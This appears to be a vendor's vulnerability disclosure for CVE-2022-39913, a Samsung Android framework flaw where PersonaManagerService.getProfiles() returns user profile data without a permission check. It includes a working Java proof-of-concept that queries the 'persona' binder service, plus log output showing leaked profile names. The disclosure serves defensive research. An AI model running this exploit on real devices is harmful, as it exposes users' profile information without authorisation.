# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.29</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39913">CVE-2022-39913</a> (SVE-2022-0789)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$330</td>
    </tr>
</table>

# Description

Oversecured discovered while analyzing system services that the `com.android.server.pm.PersonaManagerService.getProfiles()` method is unprotected and returns full user profile data. This service is not present in AOSP but added to Samsung OS. Its declaration:
```java
@Override
public List<UserInfo> getProfiles(int userHandle, boolean includeParent) {
    long token = Binder.clearCallingIdentity();
    try {
        List<UserInfo> result = new ArrayList<>();
        UserManager um = (UserManager) this.mContext.getSystemService("user");
        List<UserInfo> profiles = um.getProfiles(userHandle);
        for (UserInfo user : profiles) {
            if (!user.isDualAppProfile() && (includeParent || user.id != userHandle)) {
                result.add(user);
            }
        }
        return result;
    } finally {
        Binder.restoreCallingIdentity(token);
    }
}
```

The thing is that the AOSP method [`UserManagerService.getProfiles()`](https://android.googlesource.com/platform/frameworks/base/+/051f571/services/core/java/com/android/server/pm/UserManagerService.java#910) checks for the permission `android.permission.CREATE_USERS` and only then returns full information on user profiles.

**Proof of Concept**
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        // 1
        UserManager userManager = getSystemService(UserManager.class);
        Log.d("evil", "Profiles: " + UserManager.class.getMethod("getProfiles", int.class).invoke(userManager, 0));

        // 2
        IBinder binder = (IBinder) Class.forName("android.os.ServiceManager")
                .getMethod("getService", String.class)
                .invoke(null, "persona");
        processBinder(binder);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private void processBinder(IBinder binder) {
    try {
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken("com.samsung.android.knox.ISemPersonaManager");
        parcel.writeInt(0);
        parcel.writeBoolean(true);

        Parcel reply = Parcel.obtain();

        binder.transact(2, parcel, reply, 0);
        reply.readException();

        Log.d("evil", "Reply: " + reply.createTypedArrayList(getCreator()));
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private Parcelable.Creator getCreator() throws Throwable {
    return (Parcelable.Creator) Class.forName("android.content.pm.UserInfo")
            .getField("CREATOR")
            .get(null);
}
```

The result was as follows:
```
03-29 05:52:04.310 13510 13510 D evil     : Profiles: [UserInfo{0:null:c13}, UserInfo{150:null:10021030}]
03-29 05:52:04.311 13510 13510 D evil     : Reply: [UserInfo{0:Test Test:c13}, UserInfo{150:Secure Folder:10021030}]
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
- [Oversecured Blog. Common mistakes when using permissions in Android](https://blog.oversecured.com/Common-mistakes-when-using-permissions-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.